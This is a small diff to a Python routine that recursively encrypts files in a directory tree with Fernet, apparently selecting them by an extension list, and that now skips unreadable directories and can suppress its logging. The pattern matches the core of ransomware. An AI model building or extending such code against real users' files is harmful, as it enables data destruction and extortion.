@@ -7,7 +7,13 @@ from auth_file_ext import ext_lst
 is_silent: bool = False
 
 def encrypt_loop(dir_path: str, f: Fernet):
-    for name in listdir(dir_path):
+    try:
+        name_list = listdir(dir_path)
+    except Exception as e:
+        if is_silent == False:
+            print('(for logging purposes) ' + str(e), file=sys.stderr)
+        return 
+    for name in name_list:
         file = join(dir_path, name)
         if isdir(file):
             encrypt_loop(file, f)
